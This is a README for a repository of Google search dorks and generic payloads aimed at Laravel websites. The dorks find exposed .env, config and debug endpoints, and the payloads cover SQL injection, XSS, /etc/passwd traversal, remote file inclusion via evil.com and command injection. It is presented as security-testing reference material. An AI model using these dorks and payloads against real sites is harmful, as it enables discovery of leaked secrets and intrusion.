# Laravel Dorks Repository

![Laravel](https://img.shields.io/badge/Laravel-Framework-red)

Welcome to the Laravel Dorks repository! This collection contains specific Laravel dorks, payloads, vulnerabilities, and insights into potential security vulnerabilities or weaknesses in websites built on the Laravel PHP Framework.

## Table of Contents
- [What is Laravel?](#what-is-laravel)
- [Examples of Laravel Dorks](#examples-of-laravel-dorks)
- [Laravel Vulnerabilities](#laravel-vulnerabilities)
- [Laravel Payloads](#laravel-payloads)
- [Understanding Laravel Dorks](#understanding-laravel-dorks)
- [Exploring the GDorks Main Repository](#exploring-the-gdorks-main-repository)
- [How to Use This Repository](#how-to-use-this-repository)
- [Contributing](#contributing)
- [License](#license)

## What is Laravel?

Laravel is a popular PHP Framework known for its elegant syntax and expressive, feature-rich development. However, like any framework, Laravel applications may be susceptible to various security vulnerabilities, especially if not implemented, maintained, or secured properly.

## Examples of Laravel Dorks

These Laravel-specific dorks aim to identify potential security loopholes or vulnerabilities in Laravel-based websites:

1. **Laravel Debug Mode Dork:** Identifies websites with Laravel debug mode enabled.

   ```
   inurl:/_ignition/execute-solution
   ```

2. **Laravel Environment File Disclosure Dork:** Searches for Laravel .env file disclosure.

   ```
   inurl:/.env
   ```

3. **Laravel Error Message Dork:** Reveals detailed error messages.

   ```
   inurl:/whoops
   ```

4. **Laravel Configuration File Dork:** Looks for Laravel configuration files.

   ```
   inurl:/config/database.php
   ```

5. **Laravel Storage Directory Dork:** Checks for exposed storage directories.

   ```
   inurl:/storage/framework/views
   ```

For additional Laravel-specific dorks and in-depth explanations, explore the contents within the [GDorks repository](https://github.com/Ishanoshada/GDorks/).

## Laravel Vulnerabilities

Laravel applications may be susceptible to various security vulnerabilities, including but not limited to:

- **SQL Injection:** Laravel can be vulnerable to SQL injection attacks, especially if user inputs are not properly sanitized.
- **Sensitive Data Exposure:** Exposure of .env, config, or storage files can lead to sensitive data exposure.
- **Cross-Site Scripting (XSS):** Insecure handling of user input can lead to XSS vulnerabilities.

## Laravel Payloads for Security Testing

Here are some common Laravel payloads that can be used for security testing, auditing, or demonstrating potential vulnerabilities:

1. **SQL Injection Payloads:**

   - `' OR 1=1--`
   - `1' OR '1' = '1'--`

2. **XSS Payloads:**

   - `<script>alert('XSS')</script>`
   - `<img src="javascript:alert('XSS')" />`

3. **Path Traversal Payloads:**

   - `../../../etc/passwd`
   - `../../../../../../etc/passwd%00`

4. **Remote File Inclusion Payloads:**

   - `http://evil.com/malicious.php`
   - `data://text/plain;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`

5. **Command Injection Payloads:**

   - `; ls -la`
   - `| ls`

Please ensure you have proper authorization and permission before utilizing these payloads for security testing. Remember to act responsibly and ethically when testing Laravel applications for vulnerabilities.

## Understanding Laravel Dorks

Understanding Laravel dorks is crucial for assessing the security posture of Laravel-based websites. Recognizing these dorks allows for proactive measures to secure Laravel applications and prevent potential exploitation.

## Exploring the GDorks Main Repository

The [GDorks repository](https://github.com/Ishanoshada/GDorks/) is a rich resource containing a diverse collection of Laravel dorks, categorized folders, and comprehensive documentation covering various vulnerabilities and security insights related to Laravel Framework.

## How to Use This Repository

This repository is organized into folders, each containing specific Laravel dorks, payloads, and related information. Users can explore these folders to discover Laravel dorks and payloads of interest.

To contribute to this repository, follow the steps outlined in the [Contributing](#contributing) section.

## Contributing

Contributions to this repository are encouraged! If you have additional Laravel dorks, payloads, examples, or documentation to share, follow these steps:

1. Fork the repository.
2. Create a new branch with a descriptive name.
3. Add your Laravel dorks, payloads, or other content.
4. Submit a pull request.

Your contributions will help make this repository more comprehensive and informative for the Laravel community.

Explore, learn, and contribute responsibly to secure Laravel applications.
Happy hunting for Laravel vulnerabilities, and

 remember to act responsibly and ethically when testing security vulnerabilities.
